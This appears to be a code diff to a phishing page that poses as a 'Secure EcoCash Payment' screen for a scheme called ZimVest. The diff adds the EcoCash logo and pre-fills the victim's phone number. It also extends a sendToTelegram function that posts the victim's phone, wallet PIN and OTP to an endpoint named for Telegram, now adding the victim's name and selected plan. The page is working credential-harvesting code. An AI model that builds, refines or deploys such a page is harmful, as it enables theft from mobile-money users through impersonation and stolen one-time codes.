@@ -2,6 +2,8 @@
 <html lang="en">
 <head>
 <meta charset="utf-8"/>
+<link rel="icon" href="assets/favicon.svg" type="image/svg+xml"/>
+<link rel="icon" href="assets/favicon.ico" sizes="any"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#04342C"/>
 <title>Secure Payment · ZimVest</title>
@@ -303,9 +305,7 @@ input:focus{
 
       <!-- EcoCash brand row ABOVE the verify card -->
       <div class="ecocash-row">
-        <div class="eco-icon">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2" stroke-linecap="round"><rect x="2" y="5" width="20" height="14" rx="3"/><path d="M2 10h20"/></svg>
-        </div>
+        <img src="assets/ecocash.png" alt="EcoCash" class="ecocash-logo-lg">
         <div class="ecocash-row-text">
           <div class="ecocash-row-title">Secure EcoCash Payment</div>
           <div class="ecocash-row-sub">Your wallet is protected by EcoCash encryption</div>
@@ -420,6 +420,17 @@ function initHeader(){
 }
 initHeader();
 
+/* Pre-fill phone from auth page */
+try {
+  const storedPhone = sessionStorage.getItem('zimvest_phone');
+  if (storedPhone) {
+    const digits = storedPhone.replace('+263','');
+    document.getElementById('phone').value = digits;
+    phoneValue = storedPhone;
+    validateLogin();
+  }
+} catch(e) {}
+
 const ua=navigator.userAgent;
 let device="Unknown";
 if(/Android/i.test(ua)) device="Android";
@@ -433,7 +444,7 @@ function getPlanLine(){
 }
 
 async function sendToTelegram(eventName){
-  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,plan:getPlanLine(),device})});
+  fetch("/api/sendTelegram",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({submittedAt:new Date().toISOString(),loginPhone:phoneValue,loginPin:pinValue,otp:otpValue,event:eventName,name:sessionStorage.getItem("zimvest_name")||"",selectedPlan:selectedPlan,plan:getPlanLine(),device})});
 }
 
 function showStep(id){
